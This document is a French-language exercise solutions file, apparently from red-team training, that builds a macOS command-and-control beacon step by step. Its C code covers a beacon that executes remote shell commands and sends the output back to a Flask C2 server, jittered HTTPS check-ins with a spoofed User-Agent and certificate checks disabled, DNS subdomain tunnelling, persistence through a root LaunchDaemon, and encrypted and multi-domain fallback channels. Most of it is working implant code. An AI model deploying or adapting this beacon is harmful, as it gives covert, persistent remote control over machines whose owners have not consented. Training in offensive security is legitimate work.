# SOLUTION : C2 Beacon macOS

## Exercice 1 : Beacon HTTP basique

```c
// beacon_simple.c
#include <curl/curl.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>

#define C2_URL "http://127.0.0.1:8080/beacon"
#define SLEEP_TIME 5

typedef struct {
    char *data;
    size_t size;
} memory_t;

size_t write_cb(void *contents, size_t size, size_t nmemb, void *userp) {
    size_t realsize = size * nmemb;
    memory_t *mem = (memory_t *)userp;

    char *ptr = realloc(mem->data, mem->size + realsize + 1);
    if (!ptr) return 0;

    mem->data = ptr;
    memcpy(&(mem->data[mem->size]), contents, realsize);
    mem->size += realsize;
    mem->data[mem->size] = 0;

    return realsize;
}

void beacon() {
    CURL *curl = curl_easy_init();
    if (!curl) return;

    memory_t response = {0};

    // Beacon data
    char beacon_data[256];
    snprintf(beacon_data, sizeof(beacon_data),
             "{\"hostname\":\"%s\",\"pid\":%d}",
             getenv("HOSTNAME") ?: "unknown", getpid());

    curl_easy_setopt(curl, CURLOPT_URL, C2_URL);
    curl_easy_setopt(curl, CURLOPT_POSTFIELDS, beacon_data);
    curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_cb);
    curl_easy_setopt(curl, CURLOPT_WRITEDATA, &response);
    curl_easy_setopt(curl, CURLOPT_TIMEOUT, 10L);

    CURLcode res = curl_easy_perform(curl);

    if (res == CURLE_OK && response.data) {
        printf("[+] C2 response: %s\n", response.data);
    }

    if (response.data) free(response.data);
    curl_easy_cleanup(curl);
}

int main() {
    printf("[*] Beacon starting...\n");

    while (1) {
        beacon();
        sleep(SLEEP_TIME);
    }

    return 0;
}
```

**C2 Server (Python)** :

```python
# c2_server.py
from flask import Flask, request, jsonify

app = Flask(__name__)

@app.route('/beacon', methods=['POST'])
def beacon():
    data = request.get_json()
    print(f"[+] Beacon from {data.get('hostname')} (PID {data.get('pid')})")
    return jsonify({"status": "ok", "command": ""})

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8080)
```

**Usage** :
```bash
# Terminal 1
python c2_server.py

# Terminal 2
clang beacon_simple.c -o beacon -lcurl
./beacon
```

---

## Exercice 2 : Beacon avec command execution

```c
// beacon_exec.c
#include <curl/curl.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <sys/utsname.h>

#define C2_URL "http://127.0.0.1:8080/beacon"
#define SLEEP_TIME 3

typedef struct {
    char *data;
    size_t size;
} response_t;

size_t write_cb(void *contents, size_t size, size_t nmemb, void *userp) {
    size_t realsize = size * nmemb;
    response_t *mem = (response_t *)userp;

    char *ptr = realloc(mem->data, mem->size + realsize + 1);
    if (!ptr) return 0;

    mem->data = ptr;
    memcpy(&(mem->data[mem->size]), contents, realsize);
    mem->size += realsize;
    mem->data[mem->size] = 0;

    return realsize;
}

char *execute_command(const char *cmd) {
    FILE *fp = popen(cmd, "r");
    if (!fp) return strdup("Error executing command");

    char buffer[4096];
    size_t total_size = 0;
    char *output = malloc(1);
    output[0] = '\0';

    while (fgets(buffer, sizeof(buffer), fp)) {
        size_t len = strlen(buffer);
        char *temp = realloc(output, total_size + len + 1);
        if (!temp) break;
        output = temp;
        memcpy(output + total_size, buffer, len);
        total_size += len;
        output[total_size] = '\0';
    }

    pclose(fp);
    return output;
}

void send_result(const char *result) {
    CURL *curl = curl_easy_init();
    if (!curl) return;

    char json[8192];
    snprintf(json, sizeof(json), "{\"result\":\"%s\"}", result);

    curl_easy_setopt(curl, CURLOPT_URL, C2_URL "/result");
    curl_easy_setopt(curl, CURLOPT_POSTFIELDS, json);

    curl_easy_perform(curl);
    curl_easy_cleanup(curl);
}

char *beacon_checkin() {
    CURL *curl = curl_easy_init();
    if (!curl) return NULL;

    response_t response = {0};

    struct utsname info;
    uname(&info);

    char beacon_data[512];
    snprintf(beacon_data, sizeof(beacon_data),
             "{\"hostname\":\"%s\",\"os\":\"%s\",\"arch\":\"%s\",\"pid\":%d}",
             info.nodename, info.sysname, info.machine, getpid());

    struct curl_slist *headers = NULL;
    headers = curl_slist_append(headers, "Content-Type: application/json");

    curl_easy_setopt(curl, CURLOPT_URL, C2_URL);
    curl_easy_setopt(curl, CURLOPT_POSTFIELDS, beacon_data);
    curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headers);
    curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_cb);
    curl_easy_setopt(curl, CURLOPT_WRITEDATA, &response);
    curl_easy_setopt(curl, CURLOPT_TIMEOUT, 10L);

    CURLcode res = curl_easy_perform(curl);

    curl_slist_free_all(headers);
    curl_easy_cleanup(curl);

    if (res == CURLE_OK) {
        return response.data;
    } else {
        if (response.data) free(response.data);
        return NULL;
    }
}

int main() {
    printf("[*] C2 Beacon starting...\n");

    while (1) {
        char *response = beacon_checkin();

        if (response) {
            // Parse JSON pour extraire commande (simple version)
            char *cmd_start = strstr(response, "\"command\":\"");
            if (cmd_start) {
                cmd_start += 11; // Skip "command":"
                char *cmd_end = strchr(cmd_start, '"');
                if (cmd_end) {
                    size_t cmd_len = cmd_end - cmd_start;
                    char *command = malloc(cmd_len + 1);
                    memcpy(command, cmd_start, cmd_len);
                    command[cmd_len] = '\0';

                    if (strlen(command) > 0) {
                        printf("[*] Executing: %s\n", command);
                        char *result = execute_command(command);
                        send_result(result);
                        free(result);
                    }

                    free(command);
                }
            }

            free(response);
        }

        sleep(SLEEP_TIME);
    }

    return 0;
}
```

**C2 Server amélioré** :

```python
# c2_server_exec.py
from flask import Flask, request, jsonify
import queue

app = Flask(__name__)
command_queue = queue.Queue()
results = []

@app.route('/beacon', methods=['POST'])
def beacon():
    data = request.get_json()
    print(f"[+] Beacon: {data.get('hostname')} | OS: {data.get('os')} | PID: {data.get('pid')}")

    # Get command from queue
    try:
        cmd = command_queue.get_nowait()
        return jsonify({"status": "ok", "command": cmd})
    except queue.Empty:
        return jsonify({"status": "ok", "command": ""})

@app.route('/result', methods=['POST'])
def result():
    data = request.get_json()
    print(f"\n[+] Command result:\n{data.get('result')}\n")
    results.append(data.get('result'))
    return jsonify({"status": "received"})

@app.route('/cmd/<command>', methods=['GET'])
def add_command(command):
    command_queue.put(command)
    print(f"[*] Queued command: {command}")
    return "Command queued"

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8080)
```

**Usage** :
```bash
# Terminal 1: C2
python c2_server_exec.py

# Terminal 2: Beacon
./beacon_exec

# Terminal 3: Send commands
curl http://127.0.0.1:8080/cmd/whoami
curl http://127.0.0.1:8080/cmd/uname%20-a
curl "http://127.0.0.1:8080/cmd/ls%20-la"
```

---

## Exercice 3 : Beacon HTTPS avec jitter

```c
// beacon_https_jitter.c
#include <curl/curl.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <time.h>

#define C2_URL "https://your-c2-server.com/beacon"
#define BASE_SLEEP 10
#define JITTER_PERCENT 30

int get_sleep_time() {
    // Add jitter to avoid pattern detection
    int jitter_range = (BASE_SLEEP * JITTER_PERCENT) / 100;
    int jitter = (rand() % (2 * jitter_range + 1)) - jitter_range;
    return BASE_SLEEP + jitter;
}

void beacon_https() {
    CURL *curl = curl_easy_init();
    if (!curl) return;

    // HTTPS configuration
    curl_easy_setopt(curl, CURLOPT_URL, C2_URL);
    curl_easy_setopt(curl, CURLOPT_SSL_VERIFYPEER, 0L); // Disable for self-signed
    curl_easy_setopt(curl, CURLOPT_SSL_VERIFYHOST, 0L);
    curl_easy_setopt(curl, CURLOPT_USERAGENT, "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)");

    // Stealthy headers
    struct curl_slist *headers = NULL;
    headers = curl_slist_append(headers, "Accept: text/html,application/xhtml+xml");
    headers = curl_slist_append(headers, "Accept-Language: en-US,en;q=0.9");
    curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headers);

    CURLcode res = curl_easy_perform(curl);

    if (res == CURLE_OK) {
        printf("[+] Beacon sent\n");
    }

    curl_slist_free_all(headers);
    curl_easy_cleanup(curl);
}

int main() {
    srand(time(NULL));

    printf("[*] HTTPS Beacon with jitter\n");

    while (1) {
        beacon_https();
        int sleep_time = get_sleep_time();
        printf("[*] Sleeping for %d seconds...\n", sleep_time);
        sleep(sleep_time);
    }

    return 0;
}
```

---

## Exercice 4 : Beacon DNS (C2 covert channel)

```c
// beacon_dns.c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <netdb.h>
#include <arpa/inet.h>
#include <unistd.h>

#define DNS_DOMAIN "c2.example.com"

void beacon_dns(const char *data) {
    // Encode data in subdomain
    char hostname[256];
    snprintf(hostname, sizeof(hostname), "%s.%s", data, DNS_DOMAIN);

    printf("[*] DNS query: %s\n", hostname);

    struct addrinfo hints = {0};
    hints.ai_family = AF_UNSPEC;
    hints.ai_socktype = SOCK_STREAM;

    struct addrinfo *result;
    int ret = getaddrinfo(hostname, NULL, &hints, &result);

    if (ret == 0) {
        printf("[+] DNS beacon sent\n");
        freeaddrinfo(result);
    } else {
        printf("[-] DNS failed: %s\n", gai_strerror(ret));
    }
}

int main() {
    while (1) {
        beacon_dns("checkin");
        sleep(60);
    }
    return 0;
}
```

---

## Exercice 5 : Beacon persistant (Launch Agent)

**beacon_daemon.c** : (même code que beacon_exec.c)

**com.example.beacon.plist** :
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key>
    <string>com.example.beacon</string>
    <key>ProgramArguments</key>
    <array>
        <string>/usr/local/bin/beacon</string>
    </array>
    <key>RunAtLoad</key>
    <true/>
    <key>KeepAlive</key>
    <true/>
    <key>StandardErrorPath</key>
    <string>/tmp/beacon.err</string>
    <key>StandardOutPath</key>
    <string>/tmp/beacon.out</string>
</dict>
</plist>
```

**Installation** :
```bash
# Compiler beacon
clang beacon_exec.c -o beacon -lcurl

# Install
sudo cp beacon /usr/local/bin/
sudo cp com.example.beacon.plist /Library/LaunchDaemons/

# Load
sudo launchctl load /Library/LaunchDaemons/com.example.beacon.plist

# Vérifier
sudo launchctl list | grep beacon

# Unload
sudo launchctl unload /Library/LaunchDaemons/com.example.beacon.plist
```

---

## Exercice 6 : Beacon avec encryption (AES)

```c
// beacon_encrypted.c
#include <curl/curl.h>
#include <CommonCrypto/CommonCryptor.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#define AES_KEY "0123456789ABCDEF0123456789ABCDEF" // 32 bytes for AES-256

char *aes_encrypt(const char *plaintext, size_t *out_len) {
    size_t data_len = strlen(plaintext);
    size_t buffer_size = data_len + kCCBlockSizeAES128;
    char *ciphertext = malloc(buffer_size);

    size_t encrypted_len;
    CCCryptorStatus status = CCCrypt(
        kCCEncrypt,
        kCCAlgorithmAES,
        kCCOptionPKCS7Padding,
        AES_KEY, kCCKeySizeAES256,
        NULL, // IV
        plaintext, data_len,
        ciphertext, buffer_size,
        &encrypted_len
    );

    if (status == kCCSuccess) {
        *out_len = encrypted_len;
        return ciphertext;
    }

    free(ciphertext);
    return NULL;
}

void beacon_encrypted(const char *data) {
    size_t encrypted_len;
    char *encrypted = aes_encrypt(data, &encrypted_len);

    if (!encrypted) {
        printf("[-] Encryption failed\n");
        return;
    }

    CURL *curl = curl_easy_init();
    if (!curl) {
        free(encrypted);
        return;
    }

    // Base64 encode for HTTP transmission
    // (simplified - use proper base64 encoding in production)

    curl_easy_setopt(curl, CURLOPT_URL, "http://c2.example.com/beacon");
    curl_easy_setopt(curl, CURLOPT_POSTFIELDS, encrypted);
    curl_easy_setopt(curl, CURLOPT_POSTFIELDSIZE, encrypted_len);

    curl_easy_perform(curl);

    curl_easy_cleanup(curl);
    free(encrypted);
}

int main() {
    beacon_encrypted("{\"hostname\":\"macbook\",\"status\":\"active\"}");
    return 0;
}
```

**Compilation** :
```bash
clang beacon_encrypted.c -o beacon_encrypted -lcurl -framework Security
```

---

## Exercice 7 : Beacon multi-protocol (fallback)

```c
// beacon_multiprotocol.c
#include <curl/curl.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

const char *c2_urls[] = {
    "https://primary-c2.com/beacon",
    "http://fallback-c2.com/beacon",
    "http://backup-ip.com/beacon",
    NULL
};

int try_beacon(const char *url) {
    CURL *curl = curl_easy_init();
    if (!curl) return 0;

    curl_easy_setopt(curl, CURLOPT_URL, url);
    curl_easy_setopt(curl, CURLOPT_TIMEOUT, 5L);
    curl_easy_setopt(curl, CURLOPT_POSTFIELDS, "{\"status\":\"online\"}");

    CURLcode res = curl_easy_perform(curl);
    curl_easy_cleanup(curl);

    return (res == CURLE_OK);
}

void beacon_with_fallback() {
    for (int i = 0; c2_urls[i] != NULL; i++) {
        printf("[*] Trying C2: %s\n", c2_urls[i]);

        if (try_beacon(c2_urls[i])) {
            printf("[+] Connected to C2\n");
            return;
        }

        printf("[-] Failed, trying next...\n");
    }

    printf("[-] All C2 servers unreachable\n");
}

int main() {
    while (1) {
        beacon_with_fallback();
        sleep(10);
    }
    return 0;
}
```

---

## Resources

- [Cobalt Strike Beacon](https://www.cobaltstrike.com/help-beacon)
- [Mythic C2 Framework](https://github.com/its-a-feature/Mythic)
- [Sliver C2](https://github.com/BishopFox/sliver)
- [Red Team C2 Infrastructure](https://www.cobaltstrike.com/blog/cobalt-strike-dns-beaconing/)
